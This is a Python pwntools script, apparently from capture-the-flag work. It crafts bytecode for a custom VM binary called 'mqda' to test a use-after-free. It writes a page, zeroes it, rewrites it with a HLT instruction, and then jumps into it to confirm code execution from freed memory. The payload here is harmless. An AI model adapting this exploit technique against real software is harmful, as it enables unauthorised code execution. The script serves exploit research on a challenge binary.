#!/usr/bin/env python3
"""Carefully test UAF code execution"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def jmp_reg(reg):
    return bytes([0x0E, reg])

def push_reg(reg):
    return bytes([0x02, reg])

code_addr = 0x10000
safe_addr = 0x10100
target_addr = 0x20000  # Page to free and rewrite

# Stage 1: Jump to safe code
code1 = b''
code1 += mov_reg_imm(0, safe_addr)
code1 += jmp_reg(0)
code1 = code1.ljust(256, b'\xff')

# Stage 2: at 0x10100
# 1. Write some data to page 0x20000 (allocate it)
# 2. Zero it (free it)
# 3. Write our "malicious" code bytes to it
# 4. Jump to 0x20000 and execute our code

code2 = b''

# Step 1: Allocate page at 0x20000 with some dummy data
code2 += mov_reg_imm(15, 0x20000)
code2 += mov_reg_imm(0, 0x11111111)
code2 += push_reg(0)

# Step 2: Zero the entire page 0x20000
for offset in range(0, 256, 4):
    sp = 0x20000 | offset
    code2 += mov_reg_imm(15, sp)
    code2 += mov_reg_imm(0, 0)
    code2 += push_reg(0)

# Page 0x20000 is now freed
# Step 3: Write our code bytes to 0x20000
# Our code: HLT (0x00) = TERMINATED
# The first byte at offset 0 should be 0x00

# Actually, let's write a complete instruction
# HLT = 0x00, which when executed gives TERMINATED (exit code 1)

# Write HLT at 0x20000 (offset 0)
code2 += mov_reg_imm(15, 0x20000)
code2 += mov_reg_imm(0, 0x00000000)  # All zeros = HLT
code2 += push_reg(0)

# Step 4: Jump to 0x20000
code2 += mov_reg_imm(0, target_addr)
code2 += jmp_reg(0)
code2 += hlt()

code2 = code2.ljust(256 * 4, b'\xff')

full = code1 + code2

print(f"[*] Total code: {len(full)} bytes")

p = process(['./mqda'])
p.recvuntil(b'Code Address> ')
p.sendline(str(code_addr).encode())
p.recvuntil(b'Code Length> ')
p.sendline(str(len(full)).encode())
p.recvuntil(b'Code> ')
p.send(full)
p.recvuntil(b'Entry IP> ')
p.sendline(str(code_addr).encode())

output = p.recvall(timeout=3)
print(f"Output: {output}")

if b'TERMINATED' in output:
    print("[+] HLT executed from freed+reallocated page!")
elif b'NORMAL' in output:
    print("[+] Normal exit - different code path")
elif b'ILLEGAL' in output:
    print("[-] ILLEGAL - code execution failed")

p.close()
